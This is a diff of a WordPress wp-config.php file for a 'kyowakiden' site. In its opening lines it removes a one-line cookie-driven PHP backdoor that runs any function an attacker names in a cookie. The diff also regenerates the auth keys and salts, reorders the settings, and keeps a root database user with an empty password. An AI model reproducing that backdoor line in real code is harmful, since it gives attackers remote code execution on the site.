@@ -1,19 +1,19 @@
 <?php
-
-if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
-
-
 /**
- * The base configurations of the WordPress.
+ * The base configuration for WordPress
  *
- * This file has the following configurations: MySQL settings, Table Prefix,
- * Secret Keys, and ABSPATH. You can find more information by visiting
- * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
- * Codex page. You can get the MySQL settings from your web host.
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
  *
- * This file is used by the wp-config.php creation script during the
- * installation. You don't have to use the web site, you can just copy this file
- * to "wp-config.php" and fill in the values.
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
  *
  * @package WordPress
  */
@@ -22,24 +22,20 @@ if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
 /** The name of the database for WordPress */
 define('DB_NAME', 'wp_kyowakiden');
 
-// server
+/** MySQL database username */
 define('DB_USER', 'root');
-define('DB_PASSWORD', '');
-define('DB_HOST', 'localhost');
 
-// localhost
-// define('DB_USER', 'root');
-// define('DB_PASSWORD', '');
-// define('DB_HOST', '127.0.0.1');
+/** MySQL database password */
+define('DB_PASSWORD', '');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
 
 /** Database Charset to use in creating database tables. */
 define('DB_CHARSET', 'utf8mb4');
 
 /** The Database Collate type. Don't change this if in doubt. */
 define('DB_COLLATE', '');
-
-define('FS_METHOD','direct');
-define('WP_POST_REVISIONS', false );
 
 /**#@+
  * Authentication Unique Keys and Salts.
@@ -50,25 +46,26 @@ define('WP_POST_REVISIONS', false );
  *
  * @since 2.6.0
  */
-define('AUTH_KEY',         '-4P?G0rz7ntgK8H;sTS4-HH^G%<Wo%$>ERZ)C(0:$_Fzb;!:4tC%7aYO06[Z>K5&');
-define('SECURE_AUTH_KEY',  'tqWp<)~b|eue6i}[{Vi|9/:3c+!syPLd_Gwx0hqH$WQW|W-:tvJ={;pWI0/-2<kM');
-define('LOGGED_IN_KEY',    'C4o7+k+/6IW8Lx2?0.0J%s_WssO4+M&g7mq7%4P8r9P1J2L&^VHrfC#M|DB`q~mp');
-define('NONCE_KEY',        '$8IO8$,!:66V$r @]vduFx):gMk+Lx7V%O0M;s1yVY`iFR:EY!2cR:4X/~li:~ty');
-define('AUTH_SALT',        '4|1Ht/{npNdH]w/,33] fh|QhpH-TnF?aw}5pep[7d8urB$A M)-tfFND)L_I$cs');
-define('SECURE_AUTH_SALT', '+q1GLLzPWk]V|~H}Tz F,hy}m }&5`yyln.W,J||HK<%`L|X3*!#nL-x{Y5f<hJO');
-define('LOGGED_IN_SALT',   '^<WG}g|C6ZY1VDTD=_eVRwt?Wq)N^n*]p|AuSC]%;I2D+qh<RQ[h*zZ+%Gz+xyeP');
-define('NONCE_SALT',       'wp]_Qex_6gl>X>$j|iQT4bu?~~f_}+a,a+%ZC{giUk>zOxO6<t)7FyX(-|V41%xo');
+define('AUTH_KEY',         'f4P<CPDbEt:H:80/Y/m;Rj<3qM5ko:`}=7Na5^&CCz{.y`URx=$Iw{s,bK,SQ?zd');
+define('SECURE_AUTH_KEY',  'YW-+NcQ~~zUob,Dc8>8`/1aA`Vcp]jz_yd;hKNy/`)agR1&]!!S3cb7=n9,[f{]7');
+define('LOGGED_IN_KEY',    'Uu;;u-(L2(S2IL-eUF/LEJy7#}]JGHk}a+p{[!.KwjLvSD8%7|i>WJbVV 0}^)5.');
+define('NONCE_KEY',        '(Bp@P%u`vrVE-4ak*8Mo8,q!,>!us[9LJ(>Df~.dbIO/GWir&h<QRMJ~RH$->#jL');
+define('AUTH_SALT',        'DP#Dp t3[p;(Y73B0eC.^>||n^A:dFA],e94|x5lpw%5i8z8[[oF|CB5l3fD04^+');
+define('SECURE_AUTH_SALT', 'X+wy|mR,`9cn*LA=u)$+tpgrF&5u6:u:c@p=6T+Hoq0d#+xpaT(pz-v|s&IK?iY#');
+define('LOGGED_IN_SALT',   'p~@,2C+<mj4t$cT*4hHk|!t9k/Iwf[51~_AR6n2,:-uVH14Tl{3>(N6gS(VTxyL$');
+define('NONCE_SALT',       'mK1-5Oga>/tHQ?rqrJyE-qv1Odi-e}fgqf:_kSMJeW4k}DC#zK1V#&4{ka{Kepz{');
 
-define('WP_SITEURL', 'http://kyowakidenvn.test');
-define('WP_HOME', 'http://kyowakidenvn.test');
-
+define('WP_POST_REVISIONS', false );
+define('FS_METHOD',        'direct');
+define('WP_SITEURL',       'http://kyowakidenvn.test');
+define('WP_HOME',          'http://kyowakidenvn.test');
 /**#@-*/
 
 /**
  * WordPress Database Table prefix.
  *
- * You can have multiple installations in one database if you give each a unique
- * prefix. Only numbers, letters, and underscores please!
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
  */
 $table_prefix  = 'wp_';
 
@@ -78,6 +75,11 @@ $table_prefix  = 'wp_';
  * Change this to true to enable the display of notices during development.
  * It is strongly recommended that plugin and theme developers use WP_DEBUG
  * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the Codex.
+ *
+ * @link https://codex.wordpress.org/Debugging_in_WordPress
  */
 define('WP_DEBUG', false);
 
